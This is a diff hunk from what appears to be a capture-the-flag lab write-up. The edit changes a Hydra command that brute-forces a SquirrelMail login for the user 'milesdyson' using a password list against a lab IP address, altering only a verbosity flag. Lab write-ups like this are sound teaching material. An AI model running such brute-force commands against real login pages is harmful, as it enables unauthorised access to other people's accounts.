@@ -138,7 +138,7 @@ Finally, we have the error message that is returned to us when we try to login w
 We now have all the pieces of information in order to craft our Hydra command. We will be using the username '**milesdyson**' as that seems to be the most likely username as of now.
 
 ```
-hydra -l milesdyson -P log1.txt 10.10.86.116 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect" -vv
+hydra -l milesdyson -P log1.txt 10.10.86.116 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect" -V
 ```
 
 <img style="float: left;" src="screenshots/screenshot14.png">
